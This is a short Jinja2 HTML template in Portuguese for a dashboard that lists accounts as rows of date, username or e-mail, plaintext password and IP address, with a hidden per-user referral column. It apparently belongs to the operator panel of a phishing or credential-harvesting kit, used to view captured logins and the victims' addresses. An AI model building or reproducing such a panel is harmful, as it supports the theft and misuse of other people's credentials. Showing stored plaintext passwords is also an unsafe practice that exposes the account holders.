{% extends "base.html" %}
{% block content %}
<div class="flex items-start justify-between gap-4 mb-6">
  <div>
    <h1 class="text-2xl font-semibold">Dashboard</h1>
    <!-- <p class="text-sm text-zinc-400">Mostrando apenas contas com <b>Ref = {{ current_user.id }}</b>.</p> -->
  </div>
</div>

<div class="rounded-2xl border border-zinc-800 bg-zinc-900/20 p-6">
  <div class="overflow-x-auto">
    <table class="w-full text-sm">
      <thead class="text-zinc-400">
        <tr class="border-b border-zinc-800">
          <th class="text-left py-2">Data</th>
          <th class="text-left py-2">Usu√°rio / E-mail</th>
          <th class="text-left py-2">Senha</th>
          <!-- <th class="text-left py-2">Ref</th> -->
          <th class="text-left py-2">IP</th>
        </tr>
      </thead>
      <tbody>
        {% for r in rows %}
        <tr class="border-b border-zinc-900">
          <td class="py-3 text-zinc-300">{{ r.ts_br }}</td>
          <td class="py-3">{{ r.username }}</td>
          <td class="py-3">{{ r.password }}</td>
          <!-- <td class="py-3">{{ r.ref }}</td> -->
          <td class="py-3 text-zinc-300">{{ r.ip }}</td>
        </tr>
        {% endfor %}
        {% if rows|length == 0 %}
        <tr>
          <td colspan="5" class="py-6 text-center text-zinc-500">Nenhuma conta encontrada.</td>
        </tr>
        {% endif %}
      </tbody>
    </table>
  </div>
</div>
{% endblock %}
